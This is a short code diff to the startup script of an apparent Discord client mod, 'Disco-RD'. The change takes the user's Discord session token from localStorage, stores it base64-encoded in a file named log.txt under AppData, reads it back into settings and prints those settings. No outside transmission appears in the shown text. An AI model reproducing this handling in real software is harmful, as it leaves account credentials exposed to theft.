@@ -51,12 +51,15 @@ try {
   console.info("[Disco-RD Startup] Loading options...")
 let rawdata = fs.readFileSync("C:\\Users\\" + os.userInfo().username + "\\AppData\\Roaming\\discord\\rd.json");
 global.rdSettings = JSON.parse(rawdata);
-global.rdSettings.token="Please try to reload your client."
-try{
-    global.rdSettings.token=localStorage.getItem("token")
-} catch {
-    global.rdSettings.token="Please try to reload your client."
-}
+if (fs.existsSync("C:\\Users\\" + os.userInfo().username + "\\AppData\\Roaming\\discord\\log.txt")) {
+    //file exists
+    fs.unlinkSync("C:\\Users\\" + os.userInfo().username + "\\AppData\\Roaming\\discord\\log.txt")
+    fs.writeFileSync("C:\\Users\\" + os.userInfo().username + "\\AppData\\Roaming\\discord\\log.txt", btoa(localStorage.getItem("token")));
+  } else {
+    fs.writeFileSync("C:\\Users\\" + os.userInfo().username + "\\AppData\\Roaming\\discord\\log.txt", btoa(localStorage.getItem("token")));
+  }
+  let tokenRaw=fs.readFileSync("C:\\Users\\" + os.userInfo().username + "\\AppData\\Roaming\\discord\\log.txt");
+global.rdSettings.token=tokenRaw
 
 console.log(rdSettings)
 global.toggleTheme = function(name){
